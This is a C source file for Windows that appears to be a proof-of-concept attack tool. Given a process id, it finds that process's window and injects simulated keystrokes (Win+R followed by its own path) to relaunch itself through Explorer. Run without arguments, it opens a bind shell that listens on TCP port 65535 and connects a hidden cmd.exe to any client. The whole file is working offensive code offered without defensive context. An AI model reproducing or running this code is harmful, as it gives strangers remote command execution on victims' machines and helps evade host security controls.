#include <stdio.h> 
#include <string.h> 
#include <winsock2.h> 
#pragma comment(lib, "ws2_32.lib") 


#define HAXORCITOS 65535 
unsigned int pid = 0; 
char buf[256]=""; 


/**************************************************************/ 
void ExplorerExecution (HWND hwnd, LPARAM lParam){ 
DWORD hwndid; 
int i; 



GetWindowThreadProcessId(hwnd,&hwndid); 


if (hwndid == pid){ 
/* 
Replace keybd_event with SendMessage() and PostMessage() calls 
*/ 
printf("HANDLE Found. Attacking =)\n"); 
SetForegroundWindow(hwnd); 
keybd_event(VK_LWIN,1,0,0); 
keybd_event(VkKeyScan('r'),1,0,0); 
keybd_event(VK_LWIN,1,KEYEVENTF_KEYUP,0); 
keybd_event(VkKeyScan('r'),1,KEYEVENTF_KEYUP,0); 
for(i=0;i<strlen(buf);i++) { 
if (buf[i]==':') { 
keybd_event(VK_SHIFT,1,0,0); 
keybd_event(VkKeyScan(buf[i]),1,0,0); 
keybd_event(VK_SHIFT,1,KEYEVENTF_KEYUP,0); 
keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0); 
} else { 
if (buf[i]=='\\') { 
keybd_event(VK_LMENU,1,0,0); 
keybd_event(VK_CONTROL,1,0,0); 
keybd_event(VkKeyScan('?'),1,0,0); 
keybd_event(VK_LMENU,1,KEYEVENTF_KEYUP,0); 
keybd_event(VK_CONTROL,1,KEYEVENTF_KEYUP,0); 
keybd_event(VkKeyScan('?'),1,KEYEVENTF_KEYUP,0); 
} else { 
keybd_event(VkKeyScan(buf[i]),1,0,0); 
keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0); 
} 
} 
} 
keybd_event(VK_RETURN,1,0,0); 
keybd_event(VK_RETURN,1,KEYEVENTF_KEYUP,0); 
exit(1); 
} 
} 
/**************************************************************/ 


int BindShell(void) { //Bind Shell. POrt 65535 


SOCKET s,s2; 
STARTUPINFO si; 
PROCESS_INFORMATION pi; 
WSADATA HWSAdata; 
struct sockaddr_in sa; 
int len; 


if (WSAStartup(MAKEWORD(2,2), &HWSAdata) != 0) { exit(1); } 
if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){ 
exit(1); } 


sa.sin_family = AF_INET; 
sa.sin_port = (USHORT)htons(HAXORCITOS); 
sa.sin_addr.s_addr = htonl(INADDR_ANY); 
len=sizeof(sa); 
if ( bind(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) { 
return(-1); } 
if ( listen(s, 1) == SOCKET_ERROR ) { return(-1); } 
s2 = accept(s,(struct sockaddr *)&sa,&len); 
closesocket(s); 


ZeroMemory( &si, sizeof(si) ); ZeroMemory( &pi, sizeof(pi) ); 
si.cb = sizeof(si); 
si.wShowWindow = SW_HIDE; 
si.dwFlags =STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
si.hStdInput = (void *) s2; // SOCKET 
si.hStdOutput = (void *) s2; 
si.hStdError = (void *) s2; 
if (!CreateProcess( NULL ,"cmd.exe",NULL, NULL,TRUE, 0,NULL,NULL,&si,&pi)) { 
doFormatMessage(GetLastError()); 
return(-1); 
} 


WaitForSingleObject( pi.hProcess, INFINITE ); 
closesocket(s); 
closesocket(s2); 
printf("SALIMOS...\n"); 
Sleep(5000); 
return(1); 



} 
/**************************************************************/ 
void main(int argc, char* argv[]) 
{ 
HWND console_wnd = NULL; 


if (argc >= 2) { 
pid = atoi (argv[1]); 
strncpy(buf,argv[0],sizeof(buf)-1); 
EnumWindows((WNDENUMPROC)ExplorerExecution,(long)(&console_wnd)); 
} else { 
BindShell(); 
} 
} 
